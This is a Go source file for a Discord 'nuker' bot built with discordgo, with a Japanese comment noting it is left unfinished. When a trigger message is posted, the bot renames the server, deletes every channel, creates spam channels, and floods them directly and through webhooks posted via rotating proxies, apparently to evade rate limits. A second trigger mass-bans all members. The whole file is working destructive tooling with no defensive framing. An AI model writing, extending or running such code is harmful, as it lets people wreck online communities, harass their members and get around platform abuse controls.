// 今クソめんどくて放置中、そのうち直す
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/net/http2"
)

type Config struct {
	Token       string `json:"token"`
	Trigger     string `json:"trigger"`
	BanTrigger  string `json:"ban_trigger"`
	ServerName  string `json:"server_name"`
	WebhookName string `json:"webhook_name"`
	Setup       struct {
		ChannelName  string `json:"ch_name"`
		ChannelCount int    `json:"ch_count"`
		Content      string `json:"content"`
		MsgCount     int    `json:"msg_count"`
	} `json:"setup"`
}

var (
	cfg     Config
	proxies []*http.Client
	counter uint64
)

func main() {
	b, _ := os.ReadFile("config.json")
	json.Unmarshal(b, &cfg)

	f, _ := os.Open("proxy.txt")
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, "http") {
			line = "http://" + line
		}
		pURL, err := url.Parse(line)
		if err != nil {
			continue
		}
		proxies = append(proxies, &http.Client{
			Transport: &http.Transport{Proxy: http.ProxyURL(pURL), MaxIdleConns: 100},
			Timeout:   5 * time.Second,
		})
	}

	s, _ := discordgo.New("Bot " + cfg.Token)
	s.Identify.Intents = discordgo.IntentsAll
	s.Client = &http.Client{
		Transport: &http2.Transport{AllowHTTP: true},
		Timeout:   10 * time.Second,
	}

	s.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.Bot || m.GuildID == "" {
			return
		}

		if m.Content == cfg.Trigger {
			g := m.GuildID
			s.GuildEdit(g, &discordgo.GuildParams{Name: cfg.ServerName})

			chs, _ := s.GuildChannels(g)
			for _, c := range chs {
				s.ChannelDelete(c.ID)
			}

			time.Sleep(3 * time.Second)

			for i := 0; i < cfg.Setup.ChannelCount; i++ {
				name := cfg.Setup.ChannelName + "-" + strconv.Itoa(i)
				ch, err := s.GuildChannelCreate(g, name, discordgo.ChannelTypeGuildText)
				if err != nil {
					time.Sleep(1 * time.Second)
					continue
				}

				for j := 0; j < cfg.Setup.MsgCount; j++ {
					go s.ChannelMessageSend(ch.ID, cfg.Setup.Content)
				}

				go func(cID string) {
					w, err := s.WebhookCreate(cID, cfg.WebhookName, "")
					if err != nil {
						return
					}
					whURL := fmt.Sprintf("https://discord.com/api/webhooks/%s/%s", w.ID, w.Token)
					payload, _ := json.Marshal(map[string]string{"content": cfg.Setup.Content})

					for k := 0; k < cfg.Setup.MsgCount; k++ {
						go func() {
							if len(proxies) == 0 {
								return
							}
							idx := atomic.AddUint64(&counter, 1) % uint64(len(proxies))
							proxies[idx].Post(whURL, "application/json", bytes.NewBuffer(payload))
						}()
					}
				}(ch.ID)

				time.Sleep(200 * time.Millisecond)
			}
		}

		if m.Content == cfg.BanTrigger {
			curr := ""
			for {
				ms, _ := s.GuildMembers(m.GuildID, curr, 1000)
				if len(ms) == 0 {
					break
				}
				for _, mem := range ms {
					if mem.User.ID == s.State.User.ID {
						continue
					}
					time.Sleep(10 * time.Millisecond)
					go s.GuildBanCreateWithReason(m.GuildID, mem.User.ID, "out", 0)
					curr = mem.User.ID
				}
				if len(ms) < 1000 {
					break
				}
			}
		}
	})

	if err := s.Open(); err != nil {
		return
	}
	fmt.Printf("running\n")

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
}
